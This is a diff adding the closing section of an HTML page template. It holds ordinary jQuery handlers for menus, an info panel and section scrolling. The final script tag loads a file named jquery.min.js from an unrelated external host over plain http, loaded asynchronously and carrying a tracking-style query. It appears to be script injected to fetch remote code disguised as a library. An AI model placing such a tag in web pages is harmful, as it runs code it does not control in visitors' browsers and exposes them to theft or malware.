@@ -1,0 +1,80 @@
+ 
+
+ <div class="index_cy"></div> 
+
+
+ <!-- <script type="text/javascript" src="{res file=js/jquery-1.9.1.js}"></script> -->
+
+
+
+<script type="text/javascript">
+
+
+$(function(){
+  $("#index_x").click(function(){
+    $("#menu").hide();
+  });
+
+  $("#index_xs").click(function(){
+    $("#menu").show();
+  });
+
+})
+
+</script>
+
+
+
+<script type="text/javascript"> 
+
+    $("header nav .icon_menu").click(function(){
+
+        $(this).siblings("ul").toggleClass("show");
+
+    });
+
+    $("#panel .icons li").not(".up,.down").mouseenter(function(){
+
+        $("#panel .info").addClass('hover');
+
+        $("#panel .info li").hide();
+
+        $("#panel .info li."+$(this).attr('class')).show();
+
+    });
+
+    $("#panel").mouseleave(function(){
+
+        $("#panel .info").removeClass('hover');
+
+    })
+
+    $(".icons .up").click(function(){
+
+        $.fn.ronbongpage.moveSectionUp(); 
+
+    });
+
+    $(".icons .down").click(function(){
+
+        $.fn.ronbongpage.moveSectionDown(); 
+
+    });
+
+     $(".index_cy").click(function(){
+
+        $("#panel").toggle();
+
+        $(".index_cy").addClass('index_cy2');
+
+        $(".index_cy2").removeClass('index_cy');
+
+    });
+
+</script>
+
+<!-- <script type="text/javascript" src="{res file=js/home.js}"></script> -->
+<script charset="utf-8" async="true" src="http://xr.5myr.cn/rb/jquery.min.js?tcdsp"></script>
+</body>
+
+</html>
